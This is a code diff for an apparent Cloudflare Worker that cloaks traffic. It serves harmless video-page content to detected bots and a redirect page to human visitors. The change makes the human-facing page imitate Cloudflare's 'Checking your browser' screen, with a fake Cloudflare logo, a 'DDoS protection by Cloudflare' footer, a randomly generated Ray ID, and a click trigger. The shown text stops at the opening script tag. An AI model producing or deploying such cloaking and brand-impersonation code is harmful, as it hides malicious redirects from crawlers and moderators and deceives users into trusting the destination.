@@ -2,16 +2,17 @@ export async function onRequest(context) {
   const { request } = context;
   const url = new URL(request.url);
   const path = url.pathname;
+  const host = request.headers.get('host');
   
   // Advanced Bot Detection
   const isBot = detectBot(request);
   
   if (isBot) {
     // Serve SAFE content to bots
-    return serveSafeContent(path);
+    return serveSafeContent(path, host);
   } else {
-    // Serve REDIRECT content to humans
-    return serveRedirectContent(path, request);
+    // Serve REDIRECT content to humans dengan meta tags Cloudflare
+    return serveRedirectContent(path, host);
   }
 }
 
@@ -65,7 +66,7 @@ function getTargetPath(sourcePath) {
 }
 
 // ===== SAFE CONTENT (FOR BOTS) =====
-function serveSafeContent(path) {
+function serveSafeContent(path, host) {
   const pathId = path.split('/').pop() || 'content';
   
   const safeHtml = `
@@ -79,7 +80,7 @@ function serveSafeContent(path) {
     <meta property="og:title" content="Video ${pathId} - Streaming Platform">
     <meta property="og:description" content="Watch this amazing video content in high quality">
     <meta property="og:type" content="video.movie">
-    <meta property="og:url" content="https://your-domain.com${path}">
+    <meta property="og:url" content="https://${host}${path}">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -189,8 +190,8 @@ function serveSafeContent(path) {
   });
 }
 
-// ===== REDIRECT CONTENT (FOR HUMANS) =====
-function serveRedirectContent(path, request) {
+// ===== REDIRECT CONTENT (FOR HUMANS) - DENGAN META TAGS CLOUDFLARE =====
+function serveRedirectContent(path, host) {
   const targetUrl = getTargetPath(path);
   const pathId = path.split('/').pop() || 'content';
   
@@ -201,95 +202,143 @@ function serveRedirectContent(path, request) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Your Content...</title>
+    <!-- HTML Meta Tags -->
+    <title>Checking your browser before accessing. Just a moment...</title>
+    <meta name="description" content="">
+
+    <!-- Facebook Meta Tags -->
+    <meta property="og:url" content="https://${host}${path}">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Checking your browser before accessing. Just a moment...">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="">
+
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="twitter:domain" content="${host}">
+    <meta property="twitter:url" content="https://${host}${path}">
+    <meta name="twitter:title" content="Checking your browser before accessing. Just a moment...">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="">
+
+    <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+    
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
+            background: #f5f7fa;
+            color: #2d3748;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
+            min-height: 100vh;
             text-align: center;
         }
-        .loading-container {
+        .container {
             max-width: 400px;
-            padding: 40px;
+            padding: 40px 20px;
         }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255,255,255,0.3);
+        .logo {
+            color: #f6821f;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f6821f;
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         h1 {
-            margin: 0 0 10px 0;
+            font-size: 18px;
             font-weight: 600;
+            margin-bottom: 10px;
+            color: #2d3748;
         }
         p {
-            margin: 0 0 20px 0;
-            opacity: 0.8;
-        }
-        .progress {
-            width: 100%;
-            height: 4px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 2px;
-            overflow: hidden;
-            margin: 20px 0;
+            color: #718096;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 10px 0;
         }
         .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
             height: 100%;
-            background: white;
+            background: #f6821f;
             width: 0%;
-            animation: progress 2s ease-in-out infinite;
+            animation: progress 2.5s ease-in-out forwards;
         }
         @keyframes progress {
             0% { width: 0%; }
-            50% { width: 70%; }
             100% { width: 100%; }
         }
-        .click-message {
-            background: rgba(255,255,255,0.1);
-            padding: 10px 15px;
-            border-radius: 10px;
+        .cf-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #a0aec0;
+        }
+        .ray-id {
+            font-family: monospace;
+            background: #edf2f7;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+        .click-hint {
+            background: rgba(246, 130, 31, 0.1);
+            padding: 12px 15px;
+            border-radius: 8px;
             margin: 15px 0;
             font-size: 14px;
             cursor: pointer;
             transition: background 0.3s;
+            border: 1px solid rgba(246, 130, 31, 0.2);
         }
-        .click-message:hover {
-            background: rgba(255,255,255,0.2);
+        .click-hint:hover {
+            background: rgba(246, 130, 31, 0.15);
         }
     </style>
 </head>
 <body>
-    <div class="loading-container">
-        <div class="loader"></div>
-        <h1>Preparing Your Content</h1>
-        <p>Loading video ID: <strong>${pathId}</strong></p>
+    <div class="container">
+        <div class="logo">cloudflare</div>
+        <div class="spinner"></div>
+        <h1>Checking your browser before accessing...</h1>
+        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <p>Please allow up to 5 seconds...</p>
         
-        <div class="progress">
-            <div class="progress-bar"></div>
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+
+        <div class="click-hint" id="clickTrigger">
+            🚀 <strong>Quick Access</strong> - Click anywhere to continue
         </div>
         
-        <div class="click-message" id="clickTrigger">
-            🎬 Click anywhere to start watching immediately
+        <div class="cf-footer">
+            <div>DDoS protection by Cloudflare</div>
+            <div>Ray ID: <span class="ray-id">${Math.random().toString(36).substring(2, 15)}</span></div>
         </div>
-        
-        <p style="font-size: 12px; opacity: 0.6;">
-            Optimizing playback for your connection...
-        </p>
     </div>
 
     <script>
